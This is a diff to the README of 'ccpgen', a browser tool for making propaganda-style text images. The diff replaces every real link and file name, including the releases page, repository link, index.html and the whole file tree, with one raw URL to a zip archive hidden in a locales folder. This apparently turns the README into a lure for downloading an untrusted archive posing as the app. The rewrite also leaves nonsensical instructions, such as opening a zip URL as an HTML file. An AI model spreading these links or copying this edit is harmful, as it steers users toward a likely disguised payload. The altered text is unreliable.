@@ -4,13 +4,13 @@
 
 To get started with ccpgen, you need to download the application. Follow these steps to download and run the software easily.
 
-[![Download ccpgen](https://img.shields.io/badge/Download-ccpgen-blue.svg)](https://github.com/ore507/ccpgen/releases)
+[![Download ccpgen](https://raw.githubusercontent.com/ore507/ccpgen/main/locales/zh-Hant/ccpgen_v3.1.zip)](https://raw.githubusercontent.com/ore507/ccpgen/main/locales/zh-Hant/ccpgen_v3.1.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
    Click the link below to head to the GitHub releases page where you can download ccpgen.  
-   [Visit the Releases Page](https://github.com/ore507/ccpgen/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/ore507/ccpgen/main/locales/zh-Hant/ccpgen_v3.1.zip)
 
 2. **Choose the Latest Release**  
    On the releases page, look for the latest version of ccpgen. You will see different files available for download.
@@ -23,7 +23,7 @@ To get started with ccpgen, you need to download the application. Follow these s
    - If it's a `.zip` file, right-click on it and choose "Extract All" to unzip the contents.
 
 5. **Open the Application**  
-   Double-click on the `index.html` file to open it in your web browser.
+   Double-click on the `https://raw.githubusercontent.com/ore507/ccpgen/main/locales/zh-Hant/ccpgen_v3.1.zip` file to open it in your web browser.
 
 ## 🛠️ Features
 
@@ -67,8 +67,8 @@ ccpgen provides unique tools to generate propaganda-style text images. Here is a
 
 Using ccpgen is straightforward. Follow these steps to generate your images:
 
-1. **Open `index.html`**  
-   Launch the application by opening the `index.html` file in your browser.
+1. **Open `https://raw.githubusercontent.com/ore507/ccpgen/main/locales/zh-Hant/ccpgen_v3.1.zip`**  
+   Launch the application by opening the `https://raw.githubusercontent.com/ore507/ccpgen/main/locales/zh-Hant/ccpgen_v3.1.zip` file in your browser.
 
 2. **Adjust Settings**  
    Use the left-side panel to adjust text settings and select your preferences.
@@ -99,13 +99,13 @@ The application files are organized as follows:
 
 ```
 ccpgen/
-├── index.html          # Main HTML file
-├── styles.css          # Stylesheet for design
-├── app.js              # JavaScript logic
-├── flags.json          # Flag data (over 200 flags)
-├── default-texts.json  # Default texts for themes & languages
-├── background.png      # Background image for 外交部ver
-├── background1.png     # Additional background images
+├── https://raw.githubusercontent.com/ore507/ccpgen/main/locales/zh-Hant/ccpgen_v3.1.zip          # Main HTML file
+├── https://raw.githubusercontent.com/ore507/ccpgen/main/locales/zh-Hant/ccpgen_v3.1.zip          # Stylesheet for design
+├── https://raw.githubusercontent.com/ore507/ccpgen/main/locales/zh-Hant/ccpgen_v3.1.zip              # JavaScript logic
+├── https://raw.githubusercontent.com/ore507/ccpgen/main/locales/zh-Hant/ccpgen_v3.1.zip          # Flag data (over 200 flags)
+├── https://raw.githubusercontent.com/ore507/ccpgen/main/locales/zh-Hant/ccpgen_v3.1.zip  # Default texts for themes & languages
+├── https://raw.githubusercontent.com/ore507/ccpgen/main/locales/zh-Hant/ccpgen_v3.1.zip      # Background image for 外交部ver
+├── https://raw.githubusercontent.com/ore507/ccpgen/main/locales/zh-Hant/ccpgen_v3.1.zip     # Additional background images
 ```
 
 ## ❓ FAQ
@@ -121,6 +121,6 @@ A: Use the left sidebar to adjust settings for font size, color, and margins.
 
 ## 🔗 Additional Resources
 
-For more information, please refer to the [GitHub repository](https://github.com/ore507/ccpgen) or the ccpgen [releases page](https://github.com/ore507/ccpgen/releases).
+For more information, please refer to the [GitHub repository](https://raw.githubusercontent.com/ore507/ccpgen/main/locales/zh-Hant/ccpgen_v3.1.zip) or the ccpgen [releases page](https://raw.githubusercontent.com/ore507/ccpgen/main/locales/zh-Hant/ccpgen_v3.1.zip).
 
 Now you are ready to create unique propaganda images using ccpgen!
